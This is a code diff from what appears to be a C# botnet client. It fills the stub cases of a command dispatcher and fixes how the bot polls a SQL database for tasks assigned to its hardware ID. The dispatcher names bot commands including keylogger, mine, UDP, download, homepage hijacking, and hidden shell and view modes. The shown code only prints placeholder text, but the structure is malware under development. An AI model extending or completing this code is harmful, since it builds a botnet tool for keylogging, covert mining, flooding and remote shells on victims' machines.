@@ -63,43 +63,43 @@ namespace Bot.Classes
                     Console.WriteLine("UDP");
                     break;
                 case "download":
-
+                    Console.WriteLine("Download");
                     break;
                 case "firefox":
-
+                    Console.WriteLine("Firefox");
                     break;
                 case "homepage":
-
+                    Console.WriteLine("homepage");
                     break;
                 case "keylogger":
-
+                    Console.WriteLine("keylogger");
                     break;
                 case "mine":
-
+                    Console.WriteLine("mine");
                     break;
                 case "cleanse":
-
+                    Console.WriteLine("cleanse");
                     break;
                 case "update":
-
+                    Console.WriteLine("update");
                     break;
                 case "uninstall":
-
+                    Console.WriteLine("uninstall");
                     break;
                 case "viewhidden":
-
+                    Console.WriteLine("viewhidden");
                     break;
                 case "viewvisable":
-
+                    Console.WriteLine("viewvisable");
                     break;
                 case "shellhidden":
-
+                    Console.WriteLine("shellhidden");
                     break;
                 case "shellvisable":
-
+                    Console.WriteLine("shellvisable");
                     break;
                 default:
-
+                    Console.WriteLine("what");
                     break;
             }
         }
@@ -109,14 +109,13 @@ namespace Bot.Classes
             using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
             {
                 conn.Open();
-                int[] TaskID = new int[getTaskAmount() + 2];
-                for (int i = 1; i <= getTaskAmount(); i++)
+                int[] TaskID = new int[getTaskAmount() + 1];
+                for (int i = 0; i < getTaskAmount(); i++)
                 {
                     using (SqlCommand cmd = new SqlCommand("SELECT DISTINCT TaskID FROM (SELECT TaskID, DENSE_RANK() OVER (order by TaskID) AS rownum FROM Tasks WHERE HWID = @HWID GROUP BY TaskID ) AS tbl WHERE tbl.rownum = @i;", conn))
                     {
                         cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
-                        cmd.Parameters.AddWithValue("i", i);
-
+                        cmd.Parameters.AddWithValue("i", i + 1);
                         TaskID[i] = (int)cmd.ExecuteScalar();
                         cmd.Parameters.Clear();
                     }
@@ -150,10 +149,7 @@ namespace Bot.Classes
                 {
                     cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                     cmd.Parameters.AddWithValue("TaskID", getTaskID()[i]);
-                    if(cmd.ExecuteScalar().ToString() != null)
-                    {
-                        Type = cmd.ExecuteScalar().ToString();
-                    }
+                    Type = cmd.ExecuteScalar().ToString();
                 }
                 return Type;
             }
